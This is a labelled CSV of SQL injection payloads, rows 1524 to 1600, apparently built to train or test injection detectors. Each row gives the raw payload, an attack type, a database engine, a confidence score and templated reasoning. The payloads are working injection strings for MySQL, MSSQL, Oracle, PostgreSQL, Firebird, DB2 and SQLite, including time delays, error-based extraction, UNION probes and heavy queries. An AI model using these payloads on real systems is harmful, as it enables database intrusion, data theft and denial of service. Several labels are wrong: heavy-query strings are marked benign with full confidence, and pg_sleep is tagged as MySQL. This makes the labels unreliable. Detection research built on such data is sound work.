id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1524,"1%' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and '%' = '",boolean_blind,mysql,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1525,1' waitfor delay '0:0:5' and 'jree' = 'jree,time_blind,mssql,0.95,Time-based blind signal 'waitfor delay' detected; induces measurable delay for data inference.,3
1526,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'yaim' = 'yaim,boolean_blind,oracle,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1527,1%' ) ) union all select null#,union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1528,-4498 ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 2902 = 2902,boolean_blind,oracle,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1529,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pziy' = 'pziy,boolean_blind,firebird,0.95,Boolean logic confirmed by '6240 = ('; structured to return different results based on condition.,3
1530,1'|| ( select 'byxb' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||',boolean_blind,postgresql,0.95,Boolean logic confirmed by '8351 = 8351'; structured to return different results based on condition.,3
1531,"1"" ) ) as wnzf where 3352 = 3352 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '3352 = 3352'; structured to return different results based on condition.,2
1532,1'+ ( select 'iqxn' where 1146 = 1146 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +',boolean_blind,generic,0.95,Boolean logic confirmed by '1146 = 1146'; structured to return different results based on condition.,3
1533,"1' ) ) as kpdl where 4443 = 4443 union all select null,null,null,null,null,null--",boolean_blind,generic,0.95,Boolean logic confirmed by '4443 = 4443'; structured to return different results based on condition.,1
1534,"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'jvll' like 'jvll",boolean_blind,generic,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1535,"1"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""urqg"" = ""urqg",benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1536,-7779' ) where 4976 = 4976 or 6872 = 6872--,boolean_blind,generic,0.95,Boolean logic confirmed by '4976 = 4976'; structured to return different results based on condition.,3
1537,"select pg_sleep ( 5 ) and ""zhsc"" = ""zhsc",time_blind,mysql,0.95,Time-based blind signal 'pg_sleep' detected; induces measurable delay for data inference.,2
1538,select ( case when ( 7645 = 5921 ) then 7645 else 7645* ( select 7645 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1539,1' ) as pxcd where 9754 = 9754 or sleep ( 5 ) --,boolean_blind,mysql,0.95,Boolean logic confirmed by '9754 = 9754'; structured to return different results based on condition.,2
1540,"1 ) ) as prnp where 4932 = 4932 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '4932 = 4932'; structured to return different results based on condition.,2
1541,"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'ocfi' = 'ocfi",boolean_blind,mysql,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1542,"1"" ) ) as tjdz where 8656 = 8656 union all select null,null,null,null,null--",boolean_blind,generic,0.95,Boolean logic confirmed by '8656 = 8656'; structured to return different results based on condition.,1
1543,-5020%' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( '%' = ',boolean_blind,postgresql,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1544,"-3633' ) where 3513 = 3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",boolean_blind,generic,0.95,Boolean logic confirmed by '3513 = 3513'; structured to return different results based on condition.,1
1545,"1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""jref"" like ""jref",boolean_blind,mysql,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1546,1%' and sleep ( 5 ) #,time_blind,mysql,0.95,Time-based blind signal 'sleep (' detected; induces measurable delay for data inference.,2
1547,-4538' ) ) ) or 3260 = 1236 and ( ( ( 'hpnd' like 'hpnd,boolean_blind,generic,0.95,Boolean logic confirmed by '3260 = 1236'; structured to return different results based on condition.,3
1548,"-4136' ) ) as cczp where 7052 = 7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",boolean_blind,generic,0.95,Boolean logic confirmed by '7052 = 7052'; structured to return different results based on condition.,1
1549,"1 ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.95,Time-based blind signal 'benchmark' detected; induces measurable delay for data inference.,2
1550,"-6407' ) or elt ( 1631 = 4946,4946 ) and ( 'jpnz' = 'jpnz",boolean_blind,generic,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1551,"1"" ) ) as ccjk where 1932 = 1932 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,Boolean logic confirmed by '1932 = 1932'; structured to return different results based on condition.,3
1552,1' where 4115 = 4115,boolean_blind,generic,0.95,Boolean logic confirmed by '4115 = 4115'; structured to return different results based on condition.,2
1553,"1"" ) as gjlv where 1983 = 1983 and sleep ( 5 ) #",boolean_blind,mysql,0.95,Boolean logic confirmed by '1983 = 1983'; structured to return different results based on condition.,2
1554,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual-- vykx",time_blind,oracle,0.95,Time-based blind signal 'dbms_pipe.receive_message' detected; induces measurable delay for data inference.,3
1555,"-3860' union all select 3510,3510,3510#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1556,1' in boolean mode ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,boolean_blind,mysql,0.95,Boolean logic confirmed by '8594 = ('; structured to return different results based on condition.,2
1557,"-4527' union all select 7115,7115#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1558,"-3672"" ) ) union all select 6093#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1559,"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'zeum' = 'zeum",boolean_blind,mysql,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1560,"select count ( * ) from generate_series ( 1,5000000 ) and ( ""jzmg"" = ""jzmg",heavy_query,postgresql,0.95,Heavy query signature 'generate_series' used to cause resource-intensive processing (DoS/Time-delay).,3
1561,"select count ( * ) from generate_series ( 1,5000000 )",heavy_query,postgresql,0.95,Heavy query signature 'generate_series' used to cause resource-intensive processing (DoS/Time-delay).,3
1562,"1' ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1563,1%' ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.95,Time-based blind signal 'waitfor delay' detected; induces measurable delay for data inference.,3
1564,1' where 4473 = 4473 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,boolean_blind,mysql,0.95,Boolean logic confirmed by '4473 = 4473'; structured to return different results based on condition.,2
1565,"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 4959 = 4959",boolean_blind,oracle,0.95,Boolean logic confirmed by '4959 = 4959'; structured to return different results based on condition.,1
1566,"1"" ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""azpb"" = ""azpb",boolean_blind,firebird,0.95,Boolean logic confirmed by '7552 = ('; structured to return different results based on condition.,3
1567,"1%' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and '%' = '",time_blind,mysql,0.95,Time-based blind signal 'benchmark' detected; induces measurable delay for data inference.,2
1568,1%' ) ) ) or sleep ( 5 ) and ( ( ( '%' = ',time_blind,mysql,0.95,Time-based blind signal 'sleep (' detected; induces measurable delay for data inference.,2
1569,1'|| ( select 'xtcb' where 5240 = 5240,boolean_blind,generic,0.95,Boolean logic confirmed by '5240 = 5240'; structured to return different results based on condition.,3
1570,"1' ) ) as popm where 6594 = 6594 union all select null,null#",boolean_blind,generic,0.95,Boolean logic confirmed by '6594 = 6594'; structured to return different results based on condition.,1
1571,( select ( case when ( 7018 = 7018 ) then 7018 else 7018* ( select 7018 from master..sysdatabases ) end ) ),boolean_blind,mssql,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1572,-7770' where 6503 = 6503 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.95,Boolean logic confirmed by '6503 = 6503'; structured to return different results based on condition.,3
1573,"1"" ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""nobt"" = ""nobt",boolean_blind,generic,0.95,Boolean logic confirmed by 'if ('; structured to return different results based on condition.,2
1574,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )",benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1575,"1, ( select ( case when ( 5777 = 5777 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",boolean_blind,oracle,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1576,"1"" ) where 5065 = 5065",boolean_blind,generic,0.95,Boolean logic confirmed by '5065 = 5065'; structured to return different results based on condition.,2
1577,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kbkz' = 'kbkz",boolean_blind,generic,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1578,-2806' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'rxzr' = 'rxzr,boolean_blind,generic,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1579,"-9854%"" ) ) ) or 6455 = 3652",boolean_blind,generic,0.95,Boolean logic confirmed by '6455 = 3652'; structured to return different results based on condition.,3
1580,"1' where 4272 = 4272 union all select null,null,null,null#",boolean_blind,generic,0.95,Boolean logic confirmed by '4272 = 4272'; structured to return different results based on condition.,1
1581,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1582,1 ) as tykp where 6851 = 6851,boolean_blind,generic,0.95,Boolean logic confirmed by '6851 = 6851'; structured to return different results based on condition.,2
1583,"1' ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'dkra' like 'dkra",boolean_blind,db2,0.95,Boolean logic confirmed by '8315 = ('; structured to return different results based on condition.,3
1584,-3186 or 3867 = 9405,boolean_blind,generic,0.95,Boolean logic confirmed by '3867 = 9405'; structured to return different results based on condition.,3
1585,"1"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""quni"" = ""quni",time_blind,sqlite,0.95,Time-based blind signal 'randomblob' detected; induces measurable delay for data inference.,2
1586,"1' ) ) as jmnw where 6496 = 6496 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '6496 = 6496'; structured to return different results based on condition.,3
1587,"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'obmu' = 'obmu",boolean_blind,postgresql,0.95,Boolean logic confirmed by '8421 = ('; structured to return different results based on condition.,1
1588,"-4705' where 2029 = 2029 union all select 2029,2029,2029#",boolean_blind,generic,0.95,Boolean logic confirmed by '2029 = 2029'; structured to return different results based on condition.,1
1589,1 where 4153 = 4153 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.95,Boolean logic confirmed by '4153 = 4153'; structured to return different results based on condition.,3
1590,"1"" ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '2716 = ('; structured to return different results based on condition.,3
1591,"1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""oxxi"" = ""oxxi",boolean_blind,oracle,0.95,Boolean logic confirmed by '5286 = ('; structured to return different results based on condition.,3
1592,1'|| ( select 'ozoj' where 1608 = 1608,boolean_blind,generic,0.95,Boolean logic confirmed by '1608 = 1608'; structured to return different results based on condition.,3
1593,"-5493"" ) ) union all select 8001,8001--",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1594,"1' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.95,Time-based blind signal 'randomblob' detected; induces measurable delay for data inference.,2
1595,"1' ) ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1596,"1 ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1597,"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""dksc"" = ""dksc",boolean_blind,generic,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1598,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""%"" = """,benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1599,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'ugoz' = 'ugoz,boolean_blind,oracle,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1600,-7207' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'obxw' = 'obxw,boolean_blind,oracle,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
